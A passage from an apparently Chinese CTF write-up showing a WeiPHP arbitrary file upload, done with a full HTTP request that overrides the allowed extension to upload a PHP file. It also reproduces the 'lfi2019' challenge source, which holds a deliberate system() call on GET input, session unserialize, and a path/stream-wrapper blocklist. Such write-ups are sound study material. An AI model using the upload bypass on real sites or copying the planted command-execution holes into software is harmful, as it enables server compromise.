	<span class=o>...</span>
  <span class=nv>$info</span> <span class=o>=</span> <span class=nx>upload_files</span><span class=p>(</span><span class=nv>$setting</span><span class=p>,</span> <span class=nv>$driver</span><span class=p>,</span> <span class=nv>$config</span><span class=p>,</span> <span class=s1>&#39;download&#39;</span><span class=p>,</span> <span class=nv>$isTest</span><span class=p>);</span>
  <span class=o>...</span>
<span class=p>}</span>
</code></pre></div><p>这个函数又调用了<code>application/common.php</code>当中的<code>upload_files</code>函数，然后我们可以发现又这么一段神奇的代码：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=k>if</span> <span class=p>(</span><span class=nv>$type</span> <span class=o>==</span> <span class=s1>&#39;picture&#39;</span><span class=p>)</span> <span class=p>{</span>
  <span class=c1>//图片扩展名验证 ，图片大小不超过20M
</span><span class=c1></span>  <span class=nv>$checkRule</span><span class=p>[</span><span class=s1>&#39;ext&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;gif,jpg,jpeg,png,bmp&#39;</span><span class=p>;</span>
  <span class=nv>$checkRule</span><span class=p>[</span><span class=s1>&#39;size&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=mi>20971520</span><span class=p>;</span>
<span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
  <span class=nv>$allowExt</span> <span class=o>=</span> <span class=nx>input</span><span class=p>(</span><span class=s1>&#39;allow_file_ext&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>);</span>
  <span class=k>if</span> <span class=p>(</span><span class=nv>$allowExt</span> <span class=o>!=</span> <span class=s1>&#39;&#39;</span><span class=p>)</span> <span class=p>{</span>
    <span class=nv>$checkRule</span><span class=p>[</span><span class=s1>&#39;ext&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$allowExt</span><span class=p>;</span>
  <span class=p>}</span>
  <span class=nv>$allowSize</span> <span class=o>=</span> <span class=nx>input</span><span class=p>(</span><span class=s1>&#39;allow_file_maxsize&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>);</span>
  <span class=k>if</span> <span class=p>(</span><span class=nv>$allowSize</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
    <span class=nv>$checkRule</span><span class=p>[</span><span class=s1>&#39;size&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$allowSize</span><span class=p>;</span>
  <span class=p>}</span>
<span class=p>}</span>
</code></pre></div><p>这里<code>input('allow_file_ext', '');</code>表示我们可以设置允许上传的类型&mldr;然后我们随便上传一个试试</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=nf>POST</span> <span class=nn>/weiphp/public/index.php/home/file/upload_root</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
<span class=n>Host</span><span class=o>:</span> <span class=l>zedd.vv</span>
<span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span>
<span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
<span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
<span class=n>Content-Type</span><span class=o>:</span> <span class=l>multipart/form-data; boundary=---------------------------6593480186465200061941970669</span>
<span class=n>Content-Length</span><span class=o>:</span> <span class=l>480</span>
<span class=n>Origin</span><span class=o>:</span> <span class=l>http://zedd.vv</span>
<span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
<span class=n>Referer</span><span class=o>:</span> <span class=l>http://zedd.vv/upload.html</span>
<span class=n>Cookie</span><span class=o>:</span> <span class=l>PHPSESSID=0cfb281c78e25924ebb7c8abe9084590</span>
<span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>

-----------------------------6593480186465200061941970669
Content-Disposition: form-data; name=&#34;name&#34;; filename=&#34;1.phtml&#34;
Content-Type: text/php

&lt;?php
phpinfo();?&gt;
-----------------------------6593480186465200061941970669
Content-Disposition: form-data; name=&#34;allow_file_ext&#34;

phtml
-----------------------------6593480186465200061941970669
Content-Disposition: form-data; name=&#34;allow_file_maxsize&#34;

1024
-----------------------------6593480186465200061941970669--
</code></pre></div><p>虽然报错了但是我们依然上传成功了，直接访问那个路径即可。</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191109134834.png><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191109134834.png loading=lazy>
</a>
</figure></p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191109135000.png><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191109135000.png loading=lazy>
</a>
</figure></p>
<h2 id=lfi2019>lfi2019</h2>
<p>在 header 头有一个提示可以拿到源码</p>
<pre tabindex=0><code>X-Hint: /index.php?show-me-the-hint
</code></pre><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>

    <span class=cm>/*
</span><span class=cm>        Developed by stypr.
</span><span class=cm>        Made in 2018, Releasing in 2019!
</span><span class=cm>    */</span>

    <span class=c1>// Baka flag-sama and seed-chan! //
</span><span class=c1></span>    <span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
    <span class=nx>ini_set</span><span class=p>(</span><span class=s2>&#34;display_errors&#34;</span><span class=p>,</span><span class=s2>&#34;off&#34;</span><span class=p>);</span>
    <span class=o>@</span><span class=k>require</span><span class=p>(</span><span class=s1>&#39;flag.php&#39;</span><span class=p>);</span>
    <span class=nv>$seed</span> <span class=o>=</span> <span class=nx>md5</span><span class=p>(</span><span class=nx>rand</span><span class=p>(</span><span class=nx>PHP_INT_MIN</span><span class=p>,</span><span class=nx>PHP_INT_MAX</span><span class=p>));</span>

    <span class=k>if</span><span class=p>(</span><span class=nv>$flag</span> <span class=o>===</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;trigger&#39;</span><span class=p>]){</span>
        <span class=k>die</span><span class=p>(</span><span class=nx>hash</span><span class=p>(</span><span class=s2>&#34;sha256&#34;</span><span class=p>,</span> <span class=nv>$seed</span> <span class=o>.</span> <span class=nv>$flag</span><span class=p>));</span>
    <span class=p>}</span>

    <span class=c1>// Sessions are never used but we add that //
</span><span class=c1></span>    <span class=nx>ini_set</span><span class=p>(</span><span class=s1>&#39;session.cookie_httponly&#39;</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span> <span class=o>@</span><span class=nx>phpinfo</span><span class=p>();</span>
    <span class=nx>ini_set</span><span class=p>(</span><span class=s1>&#39;session.cookie_secure&#39;</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span> <span class=o>@</span><span class=nx>phpinfo</span><span class=p>();</span>
    <span class=nx>ini_set</span><span class=p>(</span><span class=s1>&#39;session.use_only_cookies&#39;</span><span class=p>,</span><span class=mi>1</span><span class=p>);</span> <span class=o>@</span><span class=nx>phpinfo</span><span class=p>();</span>
    <span class=nx>ini_set</span><span class=p>(</span><span class=s1>&#39;session.gc_probability&#39;</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span> <span class=o>@</span><span class=nx>phpinfo</span><span class=p>();</span>
    <span class=c1>// but really, you can&#39;t really do something with sessions. //
</span><span class=c1></span>    <span class=nx>session_save_path</span><span class=p>(</span><span class=s1>&#39;./sess/&#39;</span><span class=p>);</span>
    <span class=nx>session_name</span><span class=p>(</span><span class=s2>&#34;lfi2019&#34;</span><span class=p>);</span>
    <span class=nx>session_start</span><span class=p>();</span>
    <span class=nx>session_destroy</span><span class=p>();</span>

    <span class=c1>// Flush directory for security purposes //
</span><span class=c1></span>    <span class=c1>// Referenced it from StackOverflow: https://bit.ly/2MxvxXE //
</span><span class=c1></span>    <span class=k>function</span> <span class=nf>rrmdir</span><span class=p>(</span><span class=nv>$dir</span><span class=p>,</span> <span class=nv>$depth</span><span class=o>=</span><span class=mi>0</span><span class=p>){</span> 
        <span class=k>if</span> <span class=p>(</span><span class=nx>is_dir</span><span class=p>(</span><span class=nv>$dir</span><span class=p>)){</span>
            <span class=nv>$objects</span> <span class=o>=</span> <span class=nx>scandir</span><span class=p>(</span><span class=nv>$dir</span><span class=p>);</span> 
            <span class=k>foreach</span> <span class=p>(</span><span class=nv>$objects</span> <span class=k>as</span> <span class=nv>$object</span><span class=p>){</span> 
                <span class=k>if</span> <span class=p>(</span><span class=nv>$object</span> <span class=o>!=</span> <span class=s2>&#34;.&#34;</span> <span class=o>&amp;&amp;</span> <span class=nv>$object</span> <span class=o>!=</span> <span class=s2>&#34;..&#34;</span><span class=p>){</span> 
                    <span class=k>if</span><span class=p>(</span><span class=nx>is_dir</span><span class=p>(</span><span class=nv>$dir</span><span class=o>.</span><span class=s2>&#34;/&#34;</span><span class=o>.</span><span class=nv>$object</span><span class=p>))</span>
                        <span class=nx>rrmdir</span><span class=p>(</span><span class=nv>$dir</span><span class=o>.</span><span class=s2>&#34;/&#34;</span><span class=o>.</span><span class=nv>$object</span><span class=p>,</span> <span class=nv>$depth</span> <span class=o>+</span> <span class=mi>1</span><span class=p>);</span>
                    <span class=k>else</span>
                        <span class=nx>unlink</span><span class=p>(</span><span class=nv>$dir</span><span class=o>.</span><span class=s2>&#34;/&#34;</span><span class=o>.</span><span class=nv>$object</span><span class=p>);</span> 
                <span class=p>}</span>
            <span class=p>}</span>
        <span class=p>}</span>
        <span class=k>if</span><span class=p>(</span><span class=nv>$depth</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=nx>rmdir</span><span class=p>(</span><span class=nv>$dir</span><span class=p>);</span> 
    <span class=p>}</span>
    <span class=k>function</span> <span class=nf>countdir</span><span class=p>(</span><span class=nv>$dir</span><span class=p>){</span>
        <span class=k>if</span> <span class=p>(</span><span class=nx>is_dir</span><span class=p>(</span><span class=nv>$dir</span><span class=p>)){</span>
            <span class=nv>$objects</span> <span class=o>=</span> <span class=nx>scandir</span><span class=p>(</span><span class=nv>$dir</span><span class=p>);</span>
            <span class=k>foreach</span> <span class=p>(</span><span class=nv>$objects</span> <span class=k>as</span> <span class=nv>$object</span><span class=p>){</span> 
                <span class=k>if</span> <span class=p>(</span><span class=nv>$object</span> <span class=o>!=</span> <span class=s2>&#34;.&#34;</span> <span class=o>&amp;&amp;</span> <span class=nv>$object</span> <span class=o>!=</span> <span class=s2>&#34;..&#34;</span><span class=p>){</span> 
                    <span class=nv>$count</span> <span class=o>+=</span> <span class=mi>1</span><span class=p>;</span>
                    <span class=k>if</span><span class=p>(</span><span class=nx>is_dir</span><span class=p>(</span><span class=nv>$dir</span><span class=o>.</span><span class=s2>&#34;/&#34;</span><span class=o>.</span><span class=nv>$object</span><span class=p>))</span>
                        <span class=nv>$count</span> <span class=o>+=</span> <span class=nx>countdir</span><span class=p>(</span><span class=nv>$dir</span><span class=o>.</span><span class=s2>&#34;/&#34;</span><span class=o>.</span><span class=nv>$object</span><span class=p>);</span>
                <span class=p>}</span>
            <span class=p>}</span>
        <span class=p>}</span>
        <span class=k>return</span> <span class=nv>$count</span><span class=p>;</span>
    <span class=p>}</span>
    <span class=nx>var_dump</span><span class=p>(</span><span class=nx>countdir</span><span class=p>(</span><span class=s2>&#34;./files&#34;</span><span class=p>));</span>
    <span class=k>if</span><span class=p>(</span><span class=nx>countdir</span><span class=p>(</span><span class=s2>&#34;./files/&#34;</span><span class=p>)</span> <span class=o>&gt;=</span> <span class=mi>100</span><span class=p>)</span> <span class=o>@</span><span class=nx>rrmdir</span><span class=p>(</span><span class=s2>&#34;./files/&#34;</span><span class=p>);</span>

    <span class=c1>// Here, kawaii path-san for you! //
</span><span class=c1></span>    <span class=k>function</span> <span class=nf>path_sanitizer</span><span class=p>(</span><span class=nv>$dir</span><span class=p>,</span> <span class=nv>$harden</span><span class=o>=</span><span class=k>false</span><span class=p>){</span>
        <span class=nv>$dir</span> <span class=o>=</span> <span class=p>(</span><span class=nx>string</span><span class=p>)</span><span class=nv>$dir</span><span class=p>;</span>
        <span class=nv>$dir_len</span> <span class=o>=</span> <span class=nx>strlen</span><span class=p>(</span><span class=nv>$dir</span><span class=p>);</span>
        <span class=c1>// Deny LFI/RFI/XSS //
</span><span class=c1></span>        <span class=nv>$filter</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;.&#39;</span><span class=p>,</span> <span class=s1>&#39;./&#39;</span><span class=p>,</span> <span class=s1>&#39;~&#39;</span><span class=p>,</span> <span class=s1>&#39;.\\&#39;</span><span class=p>,</span> <span class=s1>&#39;#&#39;</span><span class=p>,</span> <span class=s1>&#39;&lt;&#39;</span><span class=p>,</span> <span class=s1>&#39;&gt;&#39;</span><span class=p>];</span>
        <span class=k>foreach</span><span class=p>(</span><span class=nv>$filter</span> <span class=k>as</span> <span class=nv>$f</span><span class=p>){</span>
            <span class=k>if</span><span class=p>(</span><span class=nx>stripos</span><span class=p>(</span><span class=nv>$dir</span><span class=p>,</span> <span class=nv>$f</span><span class=p>)</span> <span class=o>!==</span> <span class=k>false</span><span class=p>){</span>
                <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
            <span class=p>}</span>
        <span class=p>}</span>
        <span class=c1>// Deny SSRF and all possible weird bypasses //
</span><span class=c1></span>        <span class=nv>$stream</span> <span class=o>=</span> <span class=nx>stream_get_wrappers</span><span class=p>();</span>
        <span class=nv>$stream</span> <span class=o>=</span> <span class=nx>array_merge</span><span class=p>(</span><span class=nv>$stream</span><span class=p>,</span> <span class=nx>stream_get_transports</span><span class=p>());</span>
        <span class=nv>$stream</span> <span class=o>=</span> <span class=nx>array_merge</span><span class=p>(</span><span class=nv>$stream</span><span class=p>,</span> <span class=nx>stream_get_filters</span><span class=p>());</span>
        <span class=k>foreach</span><span class=p>(</span><span class=nv>$stream</span> <span class=k>as</span> <span class=nv>$f</span><span class=p>){</span>
            <span class=nv>$f_len</span> <span class=o>=</span> <span class=nx>strlen</span><span class=p>(</span><span class=nv>$f</span><span class=p>);</span>
            <span class=k>if</span><span class=p>(</span><span class=nx>substr</span><span class=p>(</span><span class=nv>$dir</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=nv>$f_len</span><span class=p>)</span> <span class=o>===</span> <span class=nv>$f</span><span class=p>){</span>
                <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
            <span class=p>}</span>
        <span class=p>}</span>
        <span class=c1>// Deny length //
</span><span class=c1></span>        <span class=k>if</span><span class=p>(</span><span class=nv>$dir_len</span> <span class=o>&gt;=</span> <span class=mi>128</span><span class=p>){</span>
            <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
        <span class=p>}</span>
		<span class=c1>// Easy level hardening //
</span><span class=c1></span>		<span class=k>if</span><span class=p>(</span><span class=nv>$harden</span><span class=p>){</span>
			<span class=nv>$harden_filter</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;/&#34;</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\\</span><span class=s2>&#34;</span><span class=p>];</span>
			<span class=k>foreach</span><span class=p>(</span><span class=nv>$harden_filter</span> <span class=k>as</span> <span class=nv>$f</span><span class=p>){</span>
				<span class=nv>$dir</span> <span class=o>=</span> <span class=nx>str_replace</span><span class=p>(</span><span class=nv>$f</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=nv>$dir</span><span class=p>);</span>
			<span class=p>}</span>
		<span class=p>}</span>

        <span class=c1>// Sanitize feature is available starting from the medium level //
</span><span class=c1></span>        <span class=k>return</span> <span class=nv>$dir</span><span class=p>;</span>
    <span class=p>}</span>

    <span class=c1>// The new kakkoii code-san is re-implemented. //
</span><span class=c1></span>    <span class=k>function</span> <span class=nf>code_sanitizer</span><span class=p>(</span><span class=nv>$code</span><span class=p>){</span>
        <span class=c1>// Computer-chan, please don&#39;t speak english. Speak something else! //
</span><span class=c1></span>        <span class=nv>$code</span> <span class=o>=</span> <span class=nx>preg_replace</span><span class=p>(</span><span class=s2>&#34;/[^&lt;&gt;!@#$%\^&amp;*\_?+\.\-</span><span class=se>\\</span><span class=s2>\&#39;</span><span class=se>\&#34;</span><span class=s2>\=\(\)\[\]\;]/u&#34;</span><span class=p>,</span> <span class=s2>&#34;*Nope*&#34;</span><span class=p>,</span> <span class=p>(</span><span class=nx>string</span><span class=p>)</span><span class=nv>$code</span><span class=p>);</span>
        <span class=k>return</span> <span class=nv>$code</span><span class=p>;</span>
    <span class=p>}</span>

    <span class=c1>// Errors are intended and straightforward. Please do not ask questions. //
</span><span class=c1></span>    <span class=k>class</span> <span class=nc>Get</span> <span class=p>{</span>
        <span class=k>protected</span> <span class=k>function</span> <span class=nf>nanahira</span><span class=p>(){</span>
            <span class=c1>// senpai notice me //
</span><span class=c1></span>            <span class=k>function</span> <span class=nf>exploit</span><span class=p>(</span><span class=nv>$data</span><span class=p>){</span>
                <span class=nv>$exploit</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>System</span><span class=p>();</span>
            <span class=p>}</span>
            <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;trigger&#39;</span><span class=p>]</span> <span class=o>&amp;&amp;</span> <span class=o>!@@@@@@@@@@@@@</span><span class=nx>exploit</span><span class=p>(</span><span class=nv>$$$$$$_GET</span><span class=p>[</span><span class=s1>&#39;leak&#39;</span><span class=p>][</span><span class=s1>&#39;leak&#39;</span><span class=p>]);</span>
        <span class=p>}</span>
        <span class=k>private</span> <span class=nv>$filename</span><span class=p>;</span>
        <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$filename</span><span class=p>){</span>
            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span> <span class=o>=</span> <span class=nx>path_sanitizer</span><span class=p>(</span><span class=nv>$filename</span><span class=p>);</span>
        <span class=p>}</span>
        <span class=k>function</span> <span class=nf>get</span><span class=p>(){</span>
            <span class=k>if</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span> <span class=o>===</span> <span class=k>false</span><span class=p>){</span>
                <span class=k>return</span> <span class=p>[</span><span class=s2>&#34;msg&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;blocked by path sanitizer&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;error&#34;</span><span class=p>];</span>
            <span class=p>}</span>
            <span class=c1>// wtf???? //
</span><span class=c1></span>            <span class=k>if</span><span class=p>(</span><span class=o>!@</span><span class=nx>file_exists</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span><span class=p>)){</span>
                <span class=c1>// index files are *completely* disabled. //
</span><span class=c1></span>                <span class=k>if</span><span class=p>(</span><span class=nx>stripos</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span><span class=p>,</span> <span class=s2>&#34;index&#34;</span><span class=p>)</span> <span class=o>!==</span> <span class=k>false</span><span class=p>){</span>
                    <span class=k>return</span> <span class=p>[</span><span class=s2>&#34;msg&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;you cannot include index files!&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;error&#34;</span><span class=p>];</span>
                <span class=p>}</span>

                <span class=c1>// hardened sanitizer spawned. thus we sense ambiguity //
</span><span class=c1></span>                <span class=nv>$read_file</span> <span class=o>=</span> <span class=s2>&#34;./files/&#34;</span> <span class=o>.</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span><span class=p>;</span>
                <span class=nv>$read_file_with_hardened_filter</span> <span class=o>=</span> <span class=s2>&#34;./files/&#34;</span> <span class=o>.</span> <span class=nx>path_sanitizer</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span><span class=p>,</span> <span class=k>true</span><span class=p>);</span>

                <span class=k>if</span><span class=p>(</span><span class=nv>$read_file</span> <span class=o>===</span> <span class=nv>$read_file_with_hardened_filter</span> <span class=o>||</span>
                    <span class=o>@</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$read_file</span><span class=p>)</span> <span class=o>===</span> <span class=o>@</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$read_file_with_hardened_filter</span><span class=p>)){</span>
                    <span class=k>return</span> <span class=p>[</span><span class=s2>&#34;msg&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;request blocked&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;error&#34;</span><span class=p>];</span>
                <span class=p>}</span>
                <span class=c1>// .. and finally, include *un*exploitable file is included. //
</span><span class=c1></span>                <span class=o>@</span><span class=k>include</span><span class=p>(</span><span class=s2>&#34;./files/&#34;</span> <span class=o>.</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span><span class=p>);</span>
                <span class=k>return</span> <span class=p>[</span><span class=s2>&#34;type&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;success&#34;</span><span class=p>];</span>
            <span class=p>}</span><span class=k>else</span><span class=p>{</span>
                <span class=k>return</span> <span class=p>[</span><span class=s2>&#34;msg&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;invalid filename (wtf)&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;error&#34;</span><span class=p>];</span>
            <span class=p>}</span>
        <span class=p>}</span>
    <span class=p>}</span>
    <span class=k>class</span> <span class=nc>Put</span> <span class=p>{</span>
        <span class=k>protected</span> <span class=k>function</span> <span class=nf>nanahira</span><span class=p>(){</span>
            <span class=c1>// senpai notice me //
</span><span class=c1></span>            <span class=k>function</span> <span class=nf>exploit</span><span class=p>(</span><span class=nv>$data</span><span class=p>){</span>
                <span class=nv>$exploit</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>System</span><span class=p>();</span>
            <span class=p>}</span>
            <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;trigger&#39;</span><span class=p>]</span> <span class=o>&amp;&amp;</span> <span class=o>!@@@@@@@@@@@@@</span><span class=nx>exploit</span><span class=p>(</span><span class=nv>$$$$$$_GET</span><span class=p>[</span><span class=s1>&#39;leak&#39;</span><span class=p>][</span><span class=s1>&#39;leak&#39;</span><span class=p>]);</span>
        <span class=p>}</span>
        <span class=k>private</span> <span class=nv>$filename</span><span class=p>;</span>
        <span class=k>private</span> <span class=nv>$content</span><span class=p>;</span>
        <span class=k>private</span> <span class=nv>$dir</span> <span class=o>=</span> <span class=s2>&#34;./files/&#34;</span><span class=p>;</span>
        <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$filename</span><span class=p>,</span> <span class=nv>$data</span><span class=p>){</span>
            <span class=k>global</span> <span class=nv>$seed</span><span class=p>;</span>
            <span class=k>if</span><span class=p>((</span><span class=nx>string</span><span class=p>)</span><span class=nv>$filename</span> <span class=o>===</span> <span class=p>(</span><span class=nx>string</span><span class=p>)</span><span class=o>@</span><span class=nx>path_sanitizer</span><span class=p>(</span><span class=nv>$data</span><span class=p>[</span><span class=s1>&#39;filename&#39;</span><span class=p>])){</span>
                <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span> <span class=o>=</span> <span class=p>(</span><span class=nx>string</span><span class=p>)</span><span class=nv>$filename</span><span class=p>;</span>
            <span class=p>}</span><span class=k>else</span><span class=p>{</span>
                <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span> <span class=o>=</span> <span class=k>false</span><span class=p>;</span>
            <span class=p>}</span>
            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>content</span> <span class=o>=</span> <span class=p>(</span><span class=nx>string</span><span class=p>)</span><span class=o>@</span><span class=nx>code_sanitizer</span><span class=p>(</span><span class=nv>$data</span><span class=p>[</span><span class=s1>&#39;content&#39;</span><span class=p>]);</span>
        <span class=p>}</span>
        <span class=k>function</span> <span class=nf>put</span><span class=p>(){</span>
            <span class=c1>// just another typical file insertion //
</span><span class=c1></span>            <span class=k>if</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span> <span class=o>===</span> <span class=k>false</span><span class=p>){</span>
                <span class=k>return</span> <span class=p>[</span><span class=s2>&#34;msg&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;blocked by path sanitizer&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;error&#34;</span><span class=p>];</span>
            <span class=p>}</span>
            <span class=c1>// check if file exists //
</span><span class=c1></span>            <span class=k>if</span><span class=p>(</span><span class=nx>file_exists</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>dir</span> <span class=o>.</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span><span class=p>)){</span>
                <span class=k>return</span> <span class=p>[</span><span class=s2>&#34;msg&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;file exists&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;error&#34;</span><span class=p>];</span>
            <span class=p>}</span>
            <span class=nx>file_put_contents</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>dir</span> <span class=o>.</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>content</span><span class=p>);</span>
            <span class=c1>// just check if file is written. hopefully. //
</span><span class=c1></span>            <span class=k>if</span><span class=p>(</span><span class=o>@</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>dir</span> <span class=o>.</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span><span class=p>)</span> <span class=o>==</span> <span class=s2>&#34;&#34;</span><span class=p>){</span>
                <span class=k>return</span> <span class=p>[</span><span class=s2>&#34;msg&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;file not written.&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;error&#34;</span><span class=p>];</span>
            <span class=p>}</span>
            <span class=k>return</span> <span class=p>[</span><span class=s2>&#34;type&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;success&#34;</span><span class=p>];</span>
        <span class=p>}</span>
    <span class=p>}</span>

    <span class=c1>// Triggering this is nearly impossible //
</span><span class=c1></span>    <span class=k>class</span> <span class=nc>System</span> <span class=p>{</span>
        <span class=k>function</span> <span class=fm>__destruct</span><span class=p>(){</span>
            <span class=k>global</span> <span class=nv>$seed</span><span class=p>;</span>
            <span class=c1>// ain&#39;t Argon2, ain&#39;t pbkdf2. what could go wrong?
</span><span class=c1></span>            <span class=nv>$flag</span> <span class=o>=</span> <span class=nx>hash</span><span class=p>(</span><span class=s1>&#39;sha256&#39;</span><span class=p>,</span> <span class=nv>$seed</span><span class=p>);</span>
            <span class=k>if</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=nv>$flag</span><span class=p>]){</span>
                <span class=o>@</span><span class=nx>system</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=nv>$flag</span><span class=p>]);</span>
            <span class=p>}</span><span class=k>else</span><span class=p>{</span>
                <span class=o>@</span><span class=nx>unserialize</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=nv>$flag</span><span class=p>]);</span>
            <span class=p>}</span>
        <span class=p>}</span>
    <span class=p>}</span>

    <span class=c1>// Don&#39;t call me a savage... I gave everything you need //
</span><span class=c1></span>    <span class=k>if</span><span class=p>(</span><span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;QUERY_STRING&#39;</span><span class=p>]</span> <span class=o>===</span> <span class=s2>&#34;show-me-the-hint&#34;</span><span class=p>){</span>
        <span class=nx>show_source</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
        <span class=k>exit</span><span class=p>;</span>
    <span class=p>}</span>

    <span class=c1>// XSS protection and hints ^-^ //
</span><span class=c1></span>    <span class=nx>header</span><span class=p>(</span><span class=s1>&#39;X-Hint: /index.php?show-me-the-hint&#39;</span><span class=p>);</span>
    <span class=nx>header</span><span class=p>(</span><span class=s1>&#39;X-Frame-Options: DENY&#39;</span><span class=p>);</span>
    <span class=nx>header</span><span class=p>(</span><span class=s1>&#39;X-XSS-Protection: 1; mode=block;&#39;</span><span class=p>);</span>
    <span class=nx>header</span><span class=p>(</span><span class=s1>&#39;X-Content-Type-Options: nosniff&#39;</span><span class=p>);</span>
    <span class=nx>header</span><span class=p>(</span><span class=s1>&#39;Content-Type: text/html; charset=utf-8&#39;</span><span class=p>);</span>
    <span class=nx>header</span><span class=p>(</span><span class=s1>&#39;Cache-Control: no-store, no-cache, must-revalidate, max-age=0&#39;</span><span class=p>);</span>

    <span class=c1>//header(&#34;Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;nonce-${seed}&#39; &#39;unsafe-eval&#39;;&#34; .
</span><span class=c1></span>    <span class=c1>//&#34;font-src &#39;nonce-${seed}&#39; fonts.gstatic.com; style-src &#39;nonce-${seed}&#39; fonts.googleapis.com;&#34;);
</span><span class=c1></span>
    <span class=c1>// Hello, JSON! //
